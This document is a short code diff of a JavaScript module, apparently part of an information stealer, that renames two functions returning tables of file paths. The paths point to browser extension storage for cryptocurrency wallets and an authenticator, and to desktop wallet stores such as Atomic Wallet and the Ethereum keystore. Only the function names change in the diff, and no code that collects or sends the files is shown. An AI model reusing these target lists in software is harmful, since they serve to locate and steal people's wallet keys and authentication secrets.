@@ -1,4 +1,4 @@
-const getExtension = () => {
+const GetExtension = () => {
     return {
 		"HarmonyOutdated": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib",
 		"Authenticator":   "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai",
@@ -60,7 +60,7 @@ const getExtension = () => {
     }
 };
 
-const getWallets = () => {
+const GetWallets = () => {
     return {
         'AtomicWallet': 'AppData\\Roaming\\atomic\\Local Storage\\leveldb',
         'Ethereum':     'AppData\\Roaming\\Ethereum\\keystore',
@@ -76,6 +76,6 @@ const getWallets = () => {
 };
 
 module.exports = {
-    getWallets,
-    getExtension
-}
+    GetWallets,
+    GetExtension
+};
